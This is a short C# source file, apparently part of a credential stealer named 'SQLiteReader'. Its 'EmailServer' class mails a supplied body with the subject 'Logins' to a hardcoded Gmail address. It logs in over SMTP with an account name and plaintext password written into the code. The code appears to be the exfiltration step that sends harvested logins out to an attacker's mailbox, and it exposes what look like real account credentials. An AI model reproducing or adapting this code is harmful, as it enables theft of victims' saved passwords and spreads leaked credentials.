using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace SQLiteReader
{
    class EmailServer
    {
        public void SendEmail(string body)
        {
             var client = new SmtpClient("smtp.gmail.com", 587)
            {
                Credentials = new NetworkCredential("goldchrisbrown@gmail.com", "yIMS0yeSPeY6"),
                EnableSsl = true
            };

            try
            {
                client.Send("goldchrisbrown@gmail.com", "goldchrisbrown@gmail.com", "Logins", body);

            }
            catch (Exception ep)
            {
                Console.WriteLine(ep.Message);
            }
        }

                       
    }
}